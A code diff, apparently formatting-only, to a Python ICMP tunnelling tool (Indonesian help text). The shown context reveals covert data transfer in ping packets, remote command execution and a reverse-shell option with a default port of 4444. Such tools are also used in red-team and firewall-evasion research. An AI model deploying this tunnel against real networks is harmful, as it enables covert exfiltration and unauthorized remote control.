@@ -90,7 +90,7 @@ def decode_packet(payload):
         return None, None, None
     if payload[:MAGIC_LEN] != MAGIC:
         return None, None, None
-    seq = struct.unpack("!H", payload[MAGIC_LEN:MAGIC_LEN + 2])[0]
+    seq = struct.unpack("!H", payload[MAGIC_LEN : MAGIC_LEN + 2])[0]
     data_type = payload[MAGIC_LEN + 2]
     data = payload[HEADER_OVERHEAD:]
     return seq, data_type, data
@@ -148,8 +148,9 @@ class ICMPServer:
                     icmp_type, pkt_id, seq, payload = unpack_icmp_packet(icmp_data)
                     if icmp_type != ICMP_ECHO_REQUEST or pkt_id != self.tunnel_id:
                         continue
-                    threading.Thread(target=self.handle_packet, args=(payload, addr, seq),
-                                     daemon=True).start()
+                    threading.Thread(
+                        target=self.handle_packet, args=(payload, addr, seq), daemon=True
+                    ).start()
         except KeyboardInterrupt:
             print_info("Server dihentikan.")
         finally:
@@ -187,7 +188,7 @@ class ICMPServer:
         payload = encode_packet(seq, data_type, data)
         if len(payload) > MAX_PAYLOAD:
             for i in range(0, len(payload), MAX_PAYLOAD):
-                chunk = payload[i:i + MAX_PAYLOAD]
+                chunk = payload[i : i + MAX_PAYLOAD]
                 pkt = pack_icmp_packet(self.tunnel_id, i, chunk, ICMP_ECHO_REPLY)
                 try:
                     self.sock.sendto(pkt, addr)
@@ -253,7 +254,7 @@ class ICMPClient:
         payload = encode_packet(seq, data_type, data)
         if len(payload) > MAX_PAYLOAD:
             for i in range(0, len(payload), MAX_PAYLOAD):
-                chunk = payload[i:i + MAX_PAYLOAD]
+                chunk = payload[i : i + MAX_PAYLOAD]
                 pkt = pack_icmp_packet(self.tunnel_id, i, chunk)
                 self.sock.sendto(pkt, (self.server, 0))
                 time.sleep(0.05)
@@ -296,7 +297,7 @@ class ICMPClient:
             return
 
         for i in range(0, len(data), 500):
-            chunk = data[i:i + 500]
+            chunk = data[i : i + 500]
             self._send_ping(DT_FILE_DATA, chunk)
             time.sleep(0.1)
 
@@ -338,17 +339,24 @@ def main():
         description="ICMP Tunnel - Tunneling data melalui paket ICMP",
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    parser.add_argument("--mode", choices=["server", "client"], required=True,
-                        help="Mode operasi (server/client)")
+    parser.add_argument(
+        "--mode", choices=["server", "client"], required=True, help="Mode operasi (server/client)"
+    )
     parser.add_argument("--server", help="IP server ICMP tunnel (mode client)")
-    parser.add_argument("--id", type=lambda x: int(x, 0), default=0x4141,
-                        help="ICMP identifier untuk filtering (default: 0x4141)")
+    parser.add_argument(
+        "--id",
+        type=lambda x: int(x, 0),
+        default=0x4141,
+        help="ICMP identifier untuk filtering (default: 0x4141)",
+    )
     parser.add_argument("--send", help="Kirim file ke server")
     parser.add_argument("--recv", help="Terima file dari server (via eksekusi command)")
     parser.add_argument("--exec", help="Eksekusi command di server")
     parser.add_argument("--reverse", action="store_true", help="Request reverse shell dari server")
     parser.add_argument("--rhost", help="Host untuk reverse shell callback")
-    parser.add_argument("--rport", type=int, default=4444, help="Port reverse shell (default: 4444)")
+    parser.add_argument(
+        "--rport", type=int, default=4444, help="Port reverse shell (default: 4444)"
+    )
 
     args = parser.parse_args()
 
